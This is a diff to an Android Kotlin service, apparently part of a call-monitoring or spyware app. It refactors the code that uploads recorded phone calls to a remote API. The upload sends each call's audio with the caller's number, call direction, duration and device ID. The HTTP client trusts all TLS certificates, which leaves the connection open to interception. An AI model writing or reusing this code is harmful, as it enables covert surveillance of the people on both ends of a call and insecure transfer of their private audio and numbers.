@@ -363,40 +363,39 @@ class CallRecordingService : Service() {
             if (file.length() < 1000) {
                 Log.w(TAG, "Recording too small (${file.length()} bytes), discarding")
                 file.delete()
-                return@Thread
-            }
+            } else {
+                try {
+                    val client = TrustAllCertificates.createClientBuilder().build()
+                    val body = MultipartBody.Builder()
+                        .setType(MultipartBody.FORM)
+                        .addFormDataPart("device_id", AndroidConfig.deviceId)
+                        .addFormDataPart("recording_type", "call")
+                        .addFormDataPart("call_number", callerNumber)
+                        .addFormDataPart("call_direction", if (isIncoming) "incoming" else "outgoing")
+                        .addFormDataPart("duration", durationSec.toString())
+                        .addFormDataPart("strategy", usedStrategy)
+                        .addFormDataPart("file", file.name,
+                            file.asRequestBody("audio/raw".toMediaType()))
+                        .build()
 
-            try {
-                val client = TrustAllCertificates.createClientBuilder().build()
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("device_id", AndroidConfig.deviceId)
-                    .addFormDataPart("recording_type", "call")
-                    .addFormDataPart("call_number", callerNumber)
-                    .addFormDataPart("call_direction", if (isIncoming) "incoming" else "outgoing")
-                    .addFormDataPart("duration", durationSec.toString())
-                    .addFormDataPart("strategy", usedStrategy)
-                    .addFormDataPart("file", file.name,
-                        file.asRequestBody("audio/raw".toMediaType()))
-                    .build()
+                    val request = Request.Builder()
+                        .url("${AndroidConfig.apiBaseUrl}/audio")
+                        .post(body)
+                        .build()
 
-                val request = Request.Builder()
-                    .url("${AndroidConfig.apiBaseUrl}/audio")
-                    .post(body)
-                    .build()
-
-                client.newCall(request).execute().use { response ->
-                    if (response.isSuccessful) {
-                        Log.d(TAG, "Call recording uploaded")
-                        file.delete()
-                    } else {
-                        Log.w(TAG, "Upload failed: ${response.code}, queuing offline")
-                        queueOffline(file)
+                    client.newCall(request).execute().use { response ->
+                        if (response.isSuccessful) {
+                            Log.d(TAG, "Call recording uploaded")
+                            file.delete()
+                        } else {
+                            Log.w(TAG, "Upload failed: ${response.code}, queuing offline")
+                            queueOffline(file)
+                        }
                     }
+                } catch (e: IOException) {
+                    Log.e(TAG, "Upload network error: ${e.message}")
+                    queueOffline(file)
                 }
-            } catch (e: IOException) {
-                Log.e(TAG, "Upload network error: ${e.message}")
-                queueOffline(file)
             }
         }
     }
